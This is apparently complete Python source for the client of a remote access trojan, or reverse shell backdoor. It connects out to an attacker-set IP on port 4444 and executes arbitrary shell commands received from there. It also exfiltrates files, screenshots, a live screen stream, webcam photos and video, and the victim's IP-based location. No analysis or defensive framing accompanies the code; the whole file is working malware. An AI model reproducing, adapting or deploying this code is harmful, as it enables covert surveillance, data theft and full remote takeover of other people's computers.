import os
import socket
import pyautogui
import cv2
import numpy as np
import time
import subprocess
import geocoder
import threading

SERVER = "YOUR IP ADDRESS"
PORT = 4444

s = socket.socket()
s.connect((SERVER, PORT))
msg = s.recv(1024).decode()
print('[*] Server:', msg)

stop_streaming_event = threading.Event()

def send_file(file_path):
    file_size = os.path.getsize(file_path)
    s.sendall(file_size.to_bytes(8, byteorder='big'))
    with open(file_path, "rb") as f:
        while (chunk := f.read(4096)):
            s.sendall(chunk)
    print(f"[+] Sent file {file_path} to server")

def get_location():
    try:
        g = geocoder.ip('me')  # Get the location based on the client's IP address
        location = f"Address: {g.address}\nLatitude: {g.latlng[0]}\nLongitude: {g.latlng[1]}"
        return location
    except Exception as e:
        return str(e)

def start_remote_screen_stream():
    try:
        while not stop_streaming_event.is_set():
            screen = pyautogui.screenshot()
            screen_np = np.array(screen)
            screen_bgr = cv2.cvtColor(screen_np, cv2.COLOR_RGB2BGR)
            _, screen_encoded = cv2.imencode('.png', screen_bgr)
            screen_data = screen_encoded.tobytes()
            s.sendall(len(screen_data).to_bytes(8, byteorder='big'))
            s.sendall(screen_data)
            time.sleep(0.1)
    except Exception as e:
        print(f"Error streaming remote screen: {e}")

def stop_streaming():
    stop_streaming_event.set()

while True:
    cmd = s.recv(1024).decode()
    print(f'[+] Received command: {cmd}')
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break
    elif cmd.startswith('cd '):
        try:
            os.chdir(cmd[3:])
            result = os.getcwd().encode() + b'\n'
        except Exception as e:
            result = str(e).encode() + b'\n'
        s.send(result)
    elif cmd == 'ls':
        try:
            result = '\n'.join(os.listdir('.')).encode() + b'\n'
        except Exception as e:
            result = str(e).encode() + b'\n'
        s.send(result)
    elif cmd.startswith('download '):
        file_name = cmd[9:]
        if os.path.exists(file_name) and os.path.isfile(file_name):
            try:
                send_file(file_name)
            except Exception as e:
                result = str(e).encode() + b'\n'
                s.send(result)
        else:
            result = f"File {file_name} does not exist".encode() + b'\n'
            s.send(result)
    elif cmd.lower() == 'screenshot':
        try:
            screenshot_path = "screenshot.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            send_file(screenshot_path)
        except Exception as e:
            result = str(e).encode() + b'\n'
            s.send(result)
    elif cmd.lower() == 'webcam_snapshot':
        try:
            cap = cv2.VideoCapture(0)
            time.sleep(2)  # Wait for the webcam to initialize
            for _ in range(5):  # Capture multiple frames to ensure the webcam is ready
                ret, frame = cap.read()
            snapshot_path = "webcam_snapshot.png"
            cv2.imwrite(snapshot_path, frame)
            cap.release()
            send_file(snapshot_path)
        except Exception as e:
            result = str(e).encode() + b'\n'
            s.send(result)
    elif cmd.lower().startswith('webcam_video'):
        try:
            duration = int(cmd.split()[1])
            video_path = "webcam_video.mp4"
            cap = cv2.VideoCapture(0)
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Use MP4V codec for mp4 files
            out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))

            start_time = time.time()
            while (time.time() - start_time) < duration:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                else:
                    break

            cap.release()
            out.release()
            send_file(video_path)
        except Exception as e:
            result = str(e).encode() + b'\n'
            s.send(result)
    elif cmd.lower() == 'location':
        try:
            location = get_location()
            s.send(location.encode())
        except Exception as e:
            result = str(e).encode() + b'\n'
            s.send(result)
    elif cmd.lower() == 'remote_screen':
        threading.Thread(target=start_remote_screen_stream).start()
        print("Live streaming started.")
    elif cmd.lower() == 'stop_streaming':
        stop_streaming()
        print("Live streaming stopped.")
    else:
        try:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True) + b'\n'
        except subprocess.CalledProcessError as e:
            result = e.output + b'\n'
        except Exception as e:
            result = str(e).encode() + b'\n'
        s.send(result)

    print('>>>')  # Prompt for the next command

s.close()
